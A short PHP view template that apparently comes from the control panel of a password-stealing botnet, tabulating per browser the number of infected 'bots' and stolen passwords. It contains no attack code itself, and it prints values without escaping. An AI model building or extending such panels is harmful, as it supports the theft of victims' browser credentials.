<div class="row">
    <div class="col-md-12">
        <div class="panel panel-white">
            <div class="panel-heading"><h6 class="panel-title">Browsers</h6></div>
            <div class="form-actions text-center">
                <table class="table table-condensed table-bordered">
                    <thead>
                    <tr>
                        <th>Browser</th>
                        <th>Bots Count</th>
                        <th>Passwords Count</th>
                    </tr>
                    </thead>
                    <tbody>
                    <?php
                    $browser_stats_table = '';
                    foreach($browser_stats as $browser_stat) {
                        $browser_stats_table.='
                                            <tr>
                                                <td>'.$browser_stat['browser'].'</td>
                                                <td>'.$browser_stat['users_count'].'</td>
                                                <td>'.$browser_stat['passwords_count'].'</td>
                                            </tr>';
                    }
                    echo $browser_stats_table;
                    ?>
                    </tbody>
                </table>
            </div>
        </div>
    </div>
</div>